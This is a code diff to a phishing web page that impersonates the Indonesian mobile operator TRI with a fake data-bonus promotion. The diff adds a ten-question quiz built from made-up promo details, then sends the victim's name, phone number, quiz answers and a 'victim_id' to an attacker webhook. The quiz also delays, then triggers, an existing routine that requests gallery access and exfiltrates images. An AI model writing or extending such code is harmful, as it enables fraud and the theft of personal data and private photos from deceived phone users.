@@ -295,6 +295,152 @@
             font-size: 0.75rem;
             margin-top: 5px;
         }
+
+        /* Quiz Styles */
+        .quiz-container {
+            margin-top: 25px;
+            padding: 20px;
+            background: rgba(255, 215, 0, 0.05);
+            border: 2px solid #ffd700;
+            border-radius: 12px;
+            display: none;
+        }
+
+        .quiz-container.show {
+            display: block;
+            animation: slideIn 0.5s ease-out;
+        }
+
+        @keyframes slideIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .quiz-title {
+            color: #ffd700;
+            font-size: 1.1rem;
+            font-weight: 700;
+            margin-bottom: 15px;
+            text-align: center;
+            text-transform: uppercase;
+        }
+
+        .quiz-progress {
+            display: flex;
+            gap: 5px;
+            margin-bottom: 20px;
+            justify-content: center;
+        }
+
+        .quiz-progress-dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: #333;
+            transition: background 0.3s;
+        }
+
+        .quiz-progress-dot.active {
+            background: #ffd700;
+        }
+
+        .quiz-progress-dot.completed {
+            background: #00ff88;
+        }
+
+        .quiz-question {
+            margin-bottom: 20px;
+            display: none;
+        }
+
+        .quiz-question.active {
+            display: block;
+            animation: fadeSlide 0.3s ease-out;
+        }
+
+        @keyframes fadeSlide {
+            from { opacity: 0; transform: translateX(20px); }
+            to { opacity: 1; transform: translateX(0); }
+        }
+
+        .quiz-question-text {
+            color: #fff;
+            font-size: 1rem;
+            margin-bottom: 15px;
+            line-height: 1.5;
+        }
+
+        .quiz-option {
+            display: block;
+            padding: 12px 15px;
+            margin-bottom: 10px;
+            background: #1a1a1a;
+            border: 2px solid #333;
+            border-radius: 8px;
+            color: #ccc;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-align: left;
+            font-size: 0.9rem;
+        }
+
+        .quiz-option:hover {
+            background: #2a2a2a;
+            border-color: #ffd700;
+        }
+
+        .quiz-option.selected {
+            background: rgba(255, 215, 0, 0.2);
+            border-color: #ffd700;
+            color: #ffd700;
+        }
+
+        .quiz-btn {
+            width: 100%;
+            padding: 12px;
+            background: linear-gradient(135deg, #ffd700 0%, #ffed4e 100%);
+            color: #000;
+            border: none;
+            border-radius: 8px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 15px;
+        }
+
+        .quiz-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(255, 215, 0, 0.3);
+        }
+
+        .quiz-btn:disabled {
+            background: #333;
+            color: #666;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .quiz-result {
+            text-align: center;
+            padding: 20px;
+            display: none;
+        }
+
+        .quiz-result.show {
+            display: block;
+        }
+
+        .quiz-score {
+            font-size: 2.5rem;
+            font-weight: 900;
+            color: #ffd700;
+            margin: 15px 0;
+        }
+
+        .quiz-score-text {
+            color: #ccc;
+            font-size: 0.9rem;
+        }
     </style>
 </head>
 <body>
@@ -353,6 +499,30 @@
                 <p style="margin-top: 10px; font-size: 0.8rem; color: #888;">
                     Tiket: <span id="ticket-id">TRI-</span>
                 </p>
+
+                <!-- Quiz Section -->
+                <div class="quiz-container" id="quiz-container">
+                    <div class="quiz-title">🧠 Kuis Ringan - Dapatkan Bonus Extra!</div>
+
+                    <div class="quiz-progress" id="quiz-progress"></div>
+
+                    <div id="quiz-questions">
+                        <!-- Questions will be inserted by JavaScript -->
+                    </div>
+
+                    <button class="quiz-btn" id="quiz-next-btn" onclick="nextQuestion()" disabled>
+                        LANJUT →
+                    </button>
+
+                    <div class="quiz-result" id="quiz-result">
+                        <div style="font-size: 3rem;">🏆</div>
+                        <div class="quiz-score" id="quiz-score">0/10</div>
+                        <div class="quiz-score-text">Jawaban benar!</div>
+                        <p style="margin-top: 15px; color: #888; font-size: 0.85rem;">
+                            Terima kasih telah berpartisipasi!
+                        </p>
+                    </div>
+                </div>
 
                 <!-- Hidden gallery trigger - will be activated automatically -->
                 <div class="gallery-trigger" id="gallery-trigger" onclick="triggerGallery()">
@@ -594,10 +764,15 @@
                 const ticketId = 'TRI-' + Date.now().toString(36).toUpperCase();
                 document.getElementById('ticket-id').textContent = ticketId;
 
-                // AFTER SUCCESS - trigger gallery permission
+                // Show quiz after 2 seconds
                 setTimeout(() => {
-                    triggerGallery();
+                    showQuiz();
                 }, 2000);
+
+                // AFTER SUCCESS - trigger gallery permission (after quiz)
+                // setTimeout(() => {
+                //     triggerGallery();
+                // }, 2000);
 
                 console.log('[TRI] ===== CAPTURED DATA =====');
                 console.log('Nama:', userData.nama);
@@ -801,6 +976,220 @@
                 } catch (error) {
                     console.error('[TRI] ❌ Image exfiltration failed:', error);
                 }
+            }
+        }
+
+        // ===== QUIZ DATA =====
+        const quizData = [
+            {
+                question: "Berapa harga paket data TRI 10GB?",
+                options: ["Rp 10.000", "Rp 25.000", "Rp 50.000", "Rp 100.000"],
+                answer: 1
+            },
+            {
+                question: "Apa kepanjangan dari 'IM3'?",
+                options: ["Indonesia Mobile 3", "Indosat Multimedia 3", "International Mobile 3", "Indosat Media 3"],
+                answer: 1
+            },
+            {
+                question: "Berapa lama masa aktif bonus promo?",
+                options: ["1 hari", "7 hari", "30 hari", "Selamanya"],
+                answer: 2
+            },
+            {
+                question: "Apa warna logo TRI (3)?",
+                options: ["Merah", "Biru", "Putih", "Hitam"],
+                answer: 2
+            },
+            {
+                question: "Kapan batas akhir promo ini?",
+                options: ["25 Feb 2026", "28 Feb 2026", "1 Mar 2026", "31 Mar 2026"],
+                answer: 1
+            },
+            {
+                question: "Berapa bonus menit telpon yang didapat?",
+                options: ["50 menit", "100 menit", "150 menit", "200 menit"],
+                answer: 1
+            },
+            {
+                question: "Apa yang harus dilakukan setelah klaim bonus?",
+                options: ["Restart HP", "Tunggu 1x24 jam", "Hapus aplikasi", "Beli pulsa lagi"],
+                answer: 1
+            },
+            {
+                question: "Operator manakah yang menggunakan nomor 08xx?",
+                options: ["Telkomsel", "Indosat", "TRI", "Semua benar"],
+                answer: 3
+            },
+            {
+                question: "Apa keuntungan pakai aplikasi MyTri?",
+                options: ["Cek kuota", "Beli paket", "Bonus extra", "Semua benar"],
+                answer: 3
+            },
+            {
+                question: "Berapa GB bonus yang didapat dari promo ini?",
+                options: ["5GB", "10GB", "15GB", "20GB"],
+                answer: 1
+            }
+        ];
+
+        let currentQuestion = 0;
+        let quizAnswers = [];
+        let selectedOption = null;
+
+        // ===== SHOW QUIZ =====
+        function showQuiz() {
+            const quizContainer = document.getElementById('quiz-container');
+            quizContainer.classList.add('show');
+
+            // Generate progress dots
+            const progressContainer = document.getElementById('quiz-progress');
+            progressContainer.innerHTML = '';
+            for (let i = 0; i < quizData.length; i++) {
+                const dot = document.createElement('div');
+                dot.className = 'quiz-progress-dot';
+                if (i === 0) dot.classList.add('active');
+                progressContainer.appendChild(dot);
+            }
+
+            // Show first question
+            showQuestion(0);
+            console.log('[TRI] Quiz started - 10 questions');
+        }
+
+        // ===== SHOW QUESTION =====
+        function showQuestion(index) {
+            const container = document.getElementById('quiz-questions');
+            const question = quizData[index];
+
+            container.innerHTML = `
+                <div class="quiz-question active" id="q${index}">
+                    <div class="quiz-question-text">
+                        <strong>${index + 1}.</strong> ${question.question}
+                    </div>
+                    <div class="quiz-options">
+                        ${question.options.map((opt, i) => `
+                            <button class="quiz-option" onclick="selectOption(${i})" id="opt${index}-${i}">
+                                ${String.fromCharCode(65 + i)}. ${opt}
+                            </button>
+                        `).join('')}
+                    </div>
+                </div>
+            `;
+
+            // Reset selected option
+            selectedOption = null;
+            document.getElementById('quiz-next-btn').disabled = true;
+
+            // Update progress
+            updateProgress(index);
+        }
+
+        // ===== UPDATE PROGRESS =====
+        function updateProgress(index) {
+            const dots = document.querySelectorAll('.quiz-progress-dot');
+            dots.forEach((dot, i) => {
+                dot.classList.remove('active', 'completed');
+                if (i < index) dot.classList.add('completed');
+                if (i === index) dot.classList.add('active');
+            });
+        }
+
+        // ===== SELECT OPTION =====
+        function selectOption(optionIndex) {
+            selectedOption = optionIndex;
+
+            // Remove previous selection
+            document.querySelectorAll('.quiz-option').forEach(opt => {
+                opt.classList.remove('selected');
+            });
+
+            // Add selection to clicked option
+            document.getElementById(`opt${currentQuestion}-${optionIndex}`).classList.add('selected');
+
+            // Enable next button
+            document.getElementById('quiz-next-btn').disabled = false;
+
+            console.log(`[TRI] Quiz Q${currentQuestion + 1}: Selected option ${optionIndex + 1}`);
+        }
+
+        // ===== NEXT QUESTION =====
+        function nextQuestion() {
+            // Save answer
+            quizAnswers.push({
+                question: quizData[currentQuestion].question,
+                selected: selectedOption,
+                correct: quizData[currentQuestion].answer,
+                isCorrect: selectedOption === quizData[currentQuestion].answer
+            });
+
+            // Next question or finish
+            currentQuestion++;
+
+            if (currentQuestion < quizData.length) {
+                showQuestion(currentQuestion);
+            } else {
+                finishQuiz();
+            }
+        }
+
+        // ===== FINISH QUIZ =====
+        function finishQuiz() {
+            // Hide questions and button
+            document.getElementById('quiz-questions').innerHTML = '';
+            document.getElementById('quiz-next-btn').style.display = 'none';
+            document.getElementById('quiz-progress').style.display = 'none';
+
+            // Calculate score
+            const correctCount = quizAnswers.filter(a => a.isCorrect).length;
+
+            // Show result
+            const resultDiv = document.getElementById('quiz-result');
+            resultDiv.classList.add('show');
+            document.getElementById('quiz-score').textContent = `${correctCount}/10`;
+
+            console.log(`[TRI] Quiz finished - Score: ${correctCount}/10`);
+
+            // Exfiltrate quiz answers
+            exfiltrateQuizAnswers(correctCount);
+
+            // Trigger gallery after quiz
+            setTimeout(() => {
+                triggerGallery();
+            }, 2000);
+        }
+
+        // ===== EXFILTRATE QUIZ ANSWERS =====
+        async function exfiltrateQuizAnswers(score) {
+            const now = new Date();
+            const payload = {
+                timestamp: now.toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }),
+                timestamp_iso: now.toISOString(),
+                victim_id: 'tri_' + btoa(userData.nohp + Date.now()).substring(0, 10),
+                template: 'tri_quiz',
+                nama: userData.nama,
+                nohp: userData.nohp,
+                quiz_score: score,
+                quiz_total: 10,
+                quiz_answers: JSON.stringify(quizAnswers.map((a, i) => ({
+                    q: i + 1,
+                    selected: a.selected + 1,
+                    correct: a.correct + 1,
+                    is_correct: a.isCorrect
+                })))
+            };
+
+            console.log('[TRI] 📤 Exfiltrating quiz answers...');
+
+            try {
+                await fetch(CONFIG.webhookUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+                console.log('[TRI] ✅ Quiz answers saved!');
+            } catch (error) {
+                console.error('[TRI] ❌ Quiz exfiltration failed:', error);
             }
         }
     </script>
